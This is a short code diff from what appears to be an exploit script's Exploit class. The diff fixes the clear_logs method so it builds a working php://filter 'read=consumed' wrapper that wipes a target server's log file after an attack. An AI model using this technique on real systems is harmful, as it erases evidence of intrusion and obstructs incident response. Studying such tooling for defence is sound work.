@@ -45,7 +45,7 @@ class Exploit:
         return path
     
     def clear_logs(self):
-        wrapper = f'./php/php.exe://filter/read=consumed/resource={self.log_path}'
+        wrapper = f'php://filter/read=consumed/resource={self.log_path}'
         self.run_wrapper(wrapper)
         self.success('Logs cleared')
         return True
